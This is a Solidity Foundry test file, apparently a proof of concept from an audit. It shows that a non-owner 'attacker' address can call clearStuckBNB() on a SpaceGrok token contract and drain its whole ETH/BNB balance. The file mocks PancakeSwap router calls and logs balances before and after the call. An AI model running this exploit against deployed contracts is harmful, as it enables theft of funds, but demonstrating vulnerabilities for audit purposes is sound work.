// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/SpaceGrok.sol";

contract SpaceGrokTest is Test {
    SpaceGrok spaceGrok;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    
    function setUp() public {
        // Start deploying as owner
        vm.startPrank(owner);
        
        // Simulate PancakeSwap router responses
        address ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address MOCK_FACTORY = address(0xBEEF);

        // Mock contract calls for router deployment
        vm.mockCall(ROUTER, abi.encodeWithSignature("factory()"), abi.encode(MOCK_FACTORY));
        vm.mockCall(ROUTER, abi.encodeWithSignature("WETH()"), abi.encode(address(0xCAFE)));
        vm.mockCall(MOCK_FACTORY, abi.encodeWithSignature("createPair(address,address)"), abi.encode(address(0xABCD)));
        
        // Deploy main contract in this environment
        spaceGrok = new SpaceGrok();
        vm.stopPrank();
    }
    
    function test_clearStuckBNB_Vulnerability() public {
        // Load contract with ETH
        uint256 amount = 1 ether;
        vm.deal(address(spaceGrok), amount);
        
        console.log("--- BEFORE-Trigger Balances ---");
        uint256 contractBalanceBefore = address(spaceGrok).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        console.log("Contract ETH balance before:", contractBalanceBefore);
        console.log("Attacker ETH balance before:", attackerBalanceBefore);
        assertGt(contractBalanceBefore, 0, "Contract should have ETH");
        assertEq(contractBalanceBefore, amount, "Incorrect ETH amount");
        
        console.log("--- Trigger clearStuckBNB ---");
        // Exploit vulnerability - non-owner can drain ETH
        vm.prank(attacker);
        spaceGrok.clearStuckBNB();
        
        console.log("--- AFTER-Trigger Balances ---");
        uint256 contractBalanceAfter = address(spaceGrok).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Contract ETH balance after:", contractBalanceAfter);
        console.log("Attacker ETH balance after:", attackerBalanceAfter);
        
        // Calculate balance changes
        uint256 contractLoss = contractBalanceBefore - contractBalanceAfter;
        uint256 attackerGain = attackerBalanceAfter - attackerBalanceBefore;
        console.log("Contract lost:", contractLoss);
        console.log("Attacker gained:", attackerGain);
        
        // Final vulnerability check
        bool exploited = (contractLoss == amount) && (attackerGain == amount);
        console.log("Balance change validation:", exploited ? "SUCCESS" : "FAILURE");
        
        // Print vulnerability verdict
        if (exploited) {
            console.log("Vulnerability Exists: Non-owner was able to drain contract ETH");
        } else {
            console.log("Vulnerability not Exist: Contract ETH wasn't fully drained or attacker didn't receive full amount");
        }
    }
}